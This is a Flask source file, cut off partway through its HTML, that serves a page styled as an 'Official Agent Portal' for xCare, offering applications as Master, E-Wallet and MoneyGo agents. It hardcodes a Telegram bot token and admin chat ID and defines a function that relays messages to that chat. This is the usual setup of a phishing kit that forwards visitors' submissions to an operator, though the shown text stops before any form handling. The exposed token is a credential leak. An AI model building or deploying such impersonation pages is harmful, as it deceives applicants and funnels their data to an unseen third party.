import os
import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- আপনার টেলিগ্রাম তথ্য ---
BOT_TOKEN = "8615529799:AAEK6NoKaghTS8CoReD_RqzugLwHoxUahNk"
ADMIN_CHAT_ID = "6471355638"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        response = requests.post(url, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

@app.route('/')
def home():
    html_content = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Official Agent Portal | xCare</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
        <style>
            body { background-color: #020617; color: white; font-family: 'Inter', sans-serif; }
            .glass-card {
                background: linear-gradient(135deg, rgba(30, 41, 59, 0.7) 0%, rgba(15, 23, 42, 0.8) 100%);
                backdrop-filter: blur(12px);
                border: 1px solid rgba(255, 255, 255, 0.08);
            }
        </style>
    </head>
    <body class="flex items-center justify-center min-h-screen p-6">
        <div class="glass-card rounded-3xl p-8 w-full max-w-md text-center">
            <h1 class="text-5xl font-bold mb-2">xC</h1>
            <p class="text-blue-400 text-xs uppercase tracking-widest mb-8">Official Agent Application</p>
            
            <div class="space-y-4">
                <a href="/apply/Master-Agent" class="block p-4 rounded-2xl bg-gray-800/50 border border-white/5 hover:border-blue-500 transition-all text-left group" style="text-decoration: none;">
                    <p class="font-bold text-lg text-white">Master Agent</p>
                    <p class="text-xs text-gray-400">Apply for top-level distribution</p>
                </a>
                <a href="/apply/E-Wallet-Agent" class="block p-4 rounded-2xl bg-gray-800/50 border border-white/5 hover:border-green-500 transition-all text-left" style="text-decoration: none;">
                    <p class="font-bold text-lg text-green-400">E-Wallet Agent</p>
                    <p class="text-xs text-gray-400">Local Payment Gateway services</p>
                </a>
                <a href="/apply/MoneyGo-Agent" class="block p-4 rounded-2xl bg-gray-800/50 border border-white/5 hover:border-purple-5
